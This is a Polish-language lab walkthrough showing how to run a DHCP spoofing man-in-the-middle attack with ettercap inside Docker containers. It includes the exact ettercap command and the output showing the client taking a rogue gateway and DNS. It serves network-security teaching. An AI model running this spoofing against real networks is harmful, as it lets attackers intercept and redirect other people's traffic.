
# Uruchomienie kontenerów

```powershell
cd man-in-the-middle
docker-compose up
```

## Wejście do powłoki kontenera

```powershell
docker exec -it <attacker/client> [ba]sh
```


>[!TIP] Wyjść z powłoki można wywołując polecenie `exit`.

# Sprawdzenie stanu początkowego

## Klient

```sh
ip a
```

Odpowiedzią powinna być konfiguracja adresów ip przypisana przez Docker gdzie widać adres `192.168.15.4/24`:
```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if100: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether d2:e1:3d:ae:8c:45 brd ff:ff:ff:ff:ff:ff
    inet 192.168.15.4/24 brd 192.168.15.255 scope global eth0
       valid_lft forever preferred_lft forever
```

# Atak DHCP spoofing

Wejdź do powłoki klienta i wywołaj polecenie:

```sh
udhcpc -i eth0 -v
```

Na kliencie uruchomienie `udhcpc -i eth0 -v` powoduje wysłanie żądania DHCP.
```bash
udhcpc -i eth0 -v
udhcpc: started, v1.37.0
udhcpc: broadcasting discover
...
...
```

Przejdź do powłoki atakującego i wywołaj polecenie:
```shell
ettercap -T -q -i eth0 -M dhcp:192.168.15.100-192.168.15.200/255.255.255.0/192.168.15.3
```
gdzie parametrami są:
- IP pool - `192.168.15.100-192.168.15.200`
- Netmask - `255.255.255.0`
- DNS server ip - `192.168.15.3`

Wynikiem wywołania tej komendy powinno być działanie:
```bash
ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  eth0 -> 02:5F:55:6F:6E:4F
          192.168.15.3/255.255.255.0


SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...
DHCP spoofing: using specified ip_pool, netmask 255.255.255.0, dns 192.168.15.3
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Hosts list:

1)      192.168.15.1    B2:08:4A:CA:E8:D3
2)      192.168.15.4    D2:E1:3D:AE:8C:45


DHCP: [D2:E1:3D:AE:8C:45] DISCOVER 
DHCP spoofing: fake OFFER [D2:E1:3D:AE:8C:45] offering 192.168.15.100 
DHCP: [192.168.15.3] OFFER : 192.168.15.100 255.255.255.0 GW 192.168.15.3 DNS 192.168.15.3 
DHCP: [D2:E1:3D:AE:8C:45] REQUEST 192.168.15.100
DHCP spoofing: fake ACK [D2:E1:3D:AE:8C:45] assigned to 192.168.15.100 
DHCP: [192.168.15.3] ACK : 192.168.15.100 255.255.255.0 GW 192.168.15.3 DNS 192.168.15.3 
```
Wynik działania Ettercap (wyświetlający komunikaty OFFER, REQUEST, ACK) odzwierciedla prawidłowy przebieg rozmowy DHCP.

A po stronie klienta powinniśmy zauważyć komunikat:
```bash
udhcpc: broadcasting select for 192.168.15.100, server 192.168.15.3
udhcpc: lease of 192.168.15.100 obtained from 192.168.15.3, lease time 1800
```
Komunikaty udhcpc, takie jak „broadcasting select for 192.168.15.100, server 192.168.15.3” oraz „lease of 192.168.15.100 obtained from 192.168.15.3, lease time 1800”, potwierdzają, że klient otrzymał fałszywe ustawienia z atakującego.

